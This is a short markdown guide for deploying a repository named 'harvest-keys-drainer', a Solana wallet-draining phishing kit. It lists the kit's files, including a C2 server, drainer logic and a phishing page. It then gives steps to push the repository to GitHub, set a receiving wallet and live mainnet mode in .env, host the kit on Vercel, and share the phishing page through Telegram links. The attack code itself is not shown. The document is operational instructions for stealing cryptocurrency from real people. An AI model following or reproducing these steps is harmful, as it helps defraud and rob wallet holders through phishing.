# GitHub Deployment Instructions

## Repository: `sobraniex/harvest-keys-drainer`

### Create the Repository (Manual Step)

Go to https://github.com/new and create:

- **Owner:** `sobraniex`
- **Repository name:** `harvest-keys-drainer`
- **Public** (default)
- **Check:** "Add a README file", "Add .gitignore: Python", "Choose a license: MIT"

### After Repository Creation, Run:

```bash
cd ~/harvest_keys
git remote set-url origin https://sobraniex:YOUR_GITHUB_PAT@github.com/sobraniex/harvest-keys-drainer.git
git push -u origin master
```

### Push Files to GitHub

Once the repo is created, push all files:

```
├── .env.example
├── README.md
├── c2_server.py
├── drainer_sol_logic.py
├── phish_sol.html
├── requirements.txt
├── vercel.json
├── vercel_build.sh
├── server.log (optional to exclude)
├── harvest_keys.db (optional to exclude)
└── venv/ (optional to exclude from deployment)
```

### Update Your `.env` with:

```env
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
TARGET_WALLET=YOUR_SOLANA_RECEIVING_ADDRESS
DB_PATH=harvest_keys.db
DRY_RUN=false
```

### Vercel Deployment

1. Import repo to Vercel
2. Add environment variables (in Vercel dashboard)
3. Deploy → Get your production URL

## Telegram Link Format

```
https://your-project.vercel.app/phish_sol.html?c2=https://your-project.vercel.app/api
```
